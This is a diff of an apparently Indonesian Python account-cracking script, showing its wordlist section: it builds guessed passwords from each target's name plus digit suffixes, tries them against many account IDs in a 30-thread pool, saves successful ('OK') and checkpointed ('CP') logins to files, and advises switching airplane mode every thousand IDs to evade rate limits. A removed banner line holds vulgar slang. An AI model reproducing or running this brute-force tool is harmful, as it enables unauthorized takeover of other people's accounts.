@@ -641,11 +641,11 @@ def setting():
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-	print(f'⚡⚡> {m}•{k}•{h}•{x} Sedang Mengejar Memek {m}•{k}•{h}•{x} <<<<< ')
+	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menggeser Matahari {m}•{k}•{h}•{x} <<<<< ')
 	print('')
-	print(f'⚡ Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
-	print(f'⚡ Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
-	print(f'⚡ Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
+	print(f'>> Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
+	print(f'>> Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
+	print(f'>> Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -658,20 +658,9 @@ def passwrd():
 					pwv.append(frs+'123')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
-					pwv.append(frs+'123456')
-					pwv.append(frs+'1234567')
-					pwv.append(frs+'12345678')
-					pwv.append(frs+'123456789')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
-					pwv.append(frs+nmf+'123')
-					pwv.append(frs+nmf+'1234')
-					pwv.append(frs+nmf+'12345')
-					pwv.append(frs+nmf+'123456')
-
-
-
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
@@ -692,16 +681,16 @@ def passwrd():
 			else:
 				pool.submit(crackmbasic,idf,pwv)
 	print('')
-	cetak(nel('\t[cyan]✓[green] Rapih, kiriman uing[cyan] ✓[white] '))
+	cetak(nel('\t[cyan]>>[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] <<[white] '))
 	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
 	print('')
-	print('⚡ Lanjut Crack Kembali ( Y/t ) ? ')
-	woi = input('⚡ Pilih : ')
+	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
+	woi = input('>> Pilih : ')
 	if woi in ['y','Y']:
 		back()
 	else:
-		print(f'\t{x}⚡{k} Good Bye Dadaahh{x} << ')
+		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
 		time.sleep(2)
 		exit()
 #--------------------[ METODE-MOBILE-1 ]-----------------#
